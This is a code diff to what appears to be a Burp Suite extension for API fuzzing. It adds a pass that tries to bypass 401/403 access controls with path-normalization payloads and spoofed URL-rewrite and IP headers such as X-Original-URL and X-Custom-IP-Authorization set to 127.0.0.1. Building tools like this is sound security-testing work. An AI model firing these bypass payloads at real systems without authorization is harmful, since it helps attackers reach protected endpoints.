@@ -1,13 +1,14 @@
-package com.security.jsapihunter.fuzz;
+package com.security.jsfuzz.fuzz;
 
 import burp.api.montoya.MontoyaApi;
 import burp.api.montoya.http.message.HttpRequestResponse;
 import burp.api.montoya.http.message.requests.HttpRequest;
-import com.security.jsapihunter.model.ApiEndpoint;
-import com.security.jsapihunter.model.FuzzAttempt;
-import com.security.jsapihunter.model.RiskLevel;
-import com.security.jsapihunter.security.HttpHelper;
+import com.security.jsfuzz.model.ApiEndpoint;
+import com.security.jsfuzz.model.FuzzAttempt;
+import com.security.jsfuzz.model.RiskLevel;
+import com.security.jsfuzz.security.HttpHelper;
 
+import java.net.URI;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.Callable;
@@ -19,7 +20,8 @@ import java.util.concurrent.Future;
 /**
  * Part 6: API fuzzing.
  * Thread pool, max concurrency 20. Implements the nine fuzz strategies from
- * the spec and records anything that looks like a bypass / status change.
+ * the spec plus a 401/403 bypass pass, and records anything that looks like a
+ * bypass / status change.
  */
 public class ApiFuzzEngine {
 
@@ -124,6 +126,11 @@ public class ApiFuzzEngine {
                     baselineStatus, baselineLength));
         }
 
+        // Fuzz 10: if the endpoint is access-controlled (401/403), try to bypass it.
+        if (baselineStatus == 401 || baselineStatus == 403) {
+            addBypassTasks(tasks, ep, baselineStatus, baselineLength);
+        }
+
         List<FuzzResult> results = new ArrayList<>();
         try {
             List<Future<FuzzResult>> futures = pool.invokeAll(tasks);
@@ -140,6 +147,53 @@ public class ApiFuzzEngine {
 
         summarize(ep, baselineStatus, results);
         return results;
+    }
+
+    /**
+     * Classic 401/403 bypass attempts: path-normalization tricks plus
+     * URL-rewrite / IP-authorization headers. A hit (was 401/403, now 2xx)
+     * is flagged interesting by attempt() and scored HIGH in summarize().
+     */
+    private void addBypassTasks(List<Callable<FuzzResult>> tasks, ApiEndpoint ep,
+                                int baselineStatus, long baselineLength) {
+        String path;
+        String suffix;
+        try {
+            URI u = URI.create(ep.getUrl());
+            String p = u.getRawPath();
+            path = (p == null || p.isEmpty()) ? "/" : p;
+            String q = u.getRawQuery();
+            suffix = (q == null || q.isEmpty()) ? "" : "?" + q;
+        } catch (IllegalArgumentException e) {
+            return; // unparseable URL, nothing to mutate
+        }
+
+        // Path-normalization payloads (replace the path portion).
+        String[] mutated = {
+                path + "/", path + "/.", path + "/./", path + "//", path + "/..;/",
+                path + "%2e", path + "..;/", path + "/~", path + "%20", path + "%09",
+                path + ".json", path.toUpperCase(), "/.." + path, "/." + path
+        };
+        for (String mp : mutated) {
+            HttpRequest req = http.build(ep.getMethod(), ep.getUrl()).withPath(mp + suffix);
+            tasks.add(() -> attempt("bypass-path:" + mp, req, baselineStatus, baselineLength));
+        }
+
+        // URL-rewrite / IP-authorization header payloads.
+        String pathForHeader = path + suffix;
+        addHeaderBypass(tasks, ep, "X-Original-URL", pathForHeader, baselineStatus, baselineLength);
+        addHeaderBypass(tasks, ep, "X-Rewrite-URL", pathForHeader, baselineStatus, baselineLength);
+        addHeaderBypass(tasks, ep, "X-Override-URL", pathForHeader, baselineStatus, baselineLength);
+        addHeaderBypass(tasks, ep, "X-Custom-IP-Authorization", "127.0.0.1", baselineStatus, baselineLength);
+        addHeaderBypass(tasks, ep, "X-Forwarded-Host", "127.0.0.1", baselineStatus, baselineLength);
+        addHeaderBypass(tasks, ep, "X-HTTP-Method-Override", "GET", baselineStatus, baselineLength);
+    }
+
+    private void addHeaderBypass(List<Callable<FuzzResult>> tasks, ApiEndpoint ep,
+                                 String header, String value,
+                                 int baselineStatus, long baselineLength) {
+        HttpRequest req = http.build(ep.getMethod(), ep.getUrl()).withAddedHeader(header, value);
+        tasks.add(() -> attempt("bypass-hdr:" + header, req, baselineStatus, baselineLength));
     }
 
     private FuzzResult attempt(String label, HttpRequest req, int baselineStatus, long baselineLength) {
